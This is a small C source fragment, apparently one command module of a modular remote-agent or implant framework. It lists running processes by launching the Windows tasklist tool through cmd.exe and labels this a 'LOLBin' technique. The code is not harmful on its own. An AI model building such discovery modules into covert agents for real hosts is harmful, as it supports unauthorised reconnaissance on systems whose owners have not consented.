// chunk: commands/cmd_processes_lolbin
// depends: core/run_cmd
// provides: cmd_processes_lolbin
// note: LOLBin — process list via tasklist (spawns child process)

#ifndef CHUNK_CMD_PROCESSES_LOLBIN
#define CHUNK_CMD_PROCESSES_LOLBIN

static int cmd_processes_lolbin(const char *args, DWORD args_len, char *out, DWORD *out_len) {
    (void)args; (void)args_len;
    run_cmd("cmd.exe /c tasklist /fo csv /nh", out, *out_len, out_len);
    return 0;
}

#endif
